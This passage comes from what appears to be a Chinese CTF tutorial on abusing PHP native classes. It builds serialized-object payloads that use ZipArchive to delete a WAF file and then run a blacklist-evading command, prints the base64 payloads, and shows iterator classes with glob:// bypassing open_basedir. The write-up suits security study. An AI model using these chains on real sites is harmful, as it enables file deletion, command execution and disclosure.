        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span>,<span class="hljs-variable">$cmd</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO"</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'so long!'</span>);
    }
}</code></pre>
<p><strong>3. 利用ZipArchive类删除文件</strong></p>
<p>联合index.php里面的Open类：</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'waf.txt'</span>)){    <span class="hljs-comment">// 当waf.txt没读取成功时才能得到flag</span>
            <span class="hljs-title function_ invoke__">shell</span>(<span class="hljs-variable">$content</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>.<span class="hljs-string">".php"</span>);    <span class="hljs-comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span>
        }
    }
}</code></pre>
<p>可知我们只要使 <code>file_get_contents('waf.txt')</code> 读取失败就可以进入 <code>shell($content)</code> 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。</p>
<p>刚好我们的ZipArchive类里面也有一个<code>open()</code>方法，</p>
<pre><code class="hljs plaintext">ZipArchive::open($filename, $flags = null)</code></pre>
<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<p>所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(-<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
}
 
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"waf.txt"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-number">8</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到payload：</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625202107801.png" alt="image-20230625202107801"></p>
<p>执行之后即可删除waf.txt。<strong>注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件</strong></p>
<p>我这里是将文件夹权限设置为www即可</p>
<p><strong>4. 命令执行绕过黑名单和字符数限制</strong></p>
<p>最后一步就是执行我们的命令去读flag，回过头来看我们的shell.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shell</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&lt;<span class="hljs-number">10</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span>,<span class="hljs-variable">$cmd</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO"</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'so long!'</span>);
    }
}</code></pre>
<p>这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例：</p>
<pre><code class="hljs plaintext">n\l /flag</code></pre>
<p>POC:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(-<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
}
 
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Open</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"xxx"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-string">"n\l /flag"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到payload：这里估计是文件位置放的不对,我总是读不到</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625203738853.png" alt="image-20230625203738853"></p>
<h3 id="106-遍历目录类">10.6 遍历目录类</h3>
<h4 id="directoryiterator-类">DirectoryIterator 类</h4>
<p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">SplFileInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">current</span> ( ) : <span class="hljs-built_in">DirectoryIterator</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getATime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getBasename</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$suffix</span> = ? ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCTime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getExtension</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFilename</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getGroup</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getInode</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMTime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getOwner</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPath</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPathname</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPerms</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getSize</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getType</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isDir</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isDot</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isExecutable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isFile</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isLink</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isReadable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isWritable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">key</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">next</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">rewind</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">seek</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$position</span> ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>    <span class="hljs-comment">// 以字符串形式获取文件名</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">valid</span> ( ) : <span class="hljs-keyword">bool</span>
}</code></pre>
<p><strong>利用 DirectoryIterator 类遍历指定目录里的文件：</strong></p>
<p>如果我们这样：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p>会创建一个指定目录的迭代器。当执行到<code>echo</code>函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名：</p>
<p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:// 协议用来查找匹配的文件路径模式</p>
</blockquote>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"glob:///*flag*"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625205744849.png" alt="image-20230625205744849"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625205821179.png" alt="image-20230625205821179"></p>
<p>如果想输出全部的文件名我们还需要对$dir对象进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">'&lt;br&gt;'</span>);
}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210110744.png" alt="image-20230625210110744"></p>
<h4 id="filesystemiterator-类">FilesystemIterator 类</h4>
<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210142667.png" alt="image-20230625210142667"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"glob:///*flag*"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210153955.png" alt="image-20230625210153955"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">'&lt;br&gt;'</span>);
}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210207128.png" alt="image-20230625210207128"></p>
<h4 id="globiterator-类">GlobIterator 类</h4>
<p>与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-comment">/* 继承的方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p>我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;
 
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 <code>GlobIterator(/*flag*)</code>：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210327846.png" alt="image-20230625210327846"></p>
<h4 id="使用可遍历目录类绕过-open_basedir">使用可遍历目录类绕过 open_basedir</h4>
<p>DirectoryIterator类或者FilesystemIterator类与glob://协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>];
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);<span class="hljs-comment">// 不加__toString()也可,因为echo可以自动调用</span>
}
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment"># payload一句话的形式:</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"glob:///*"</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210420068.png" alt="image-20230625210420068"></p>
<p>使用FilesystemIterator类同理。</p>
<p>而使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>];
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);<span class="hljs-comment">// 不加__toString()也可,因为echo可以自动调用</span>
}
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment"># payload一句话的形式:</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/*"</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210529814.png" alt="image-20230625210529814"></p>
<h3 id="107-可读取文件类">10.7 可读取文件类</h3>
<h4 id="splfileobject-类">SplFileObject 类</h4>
<p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
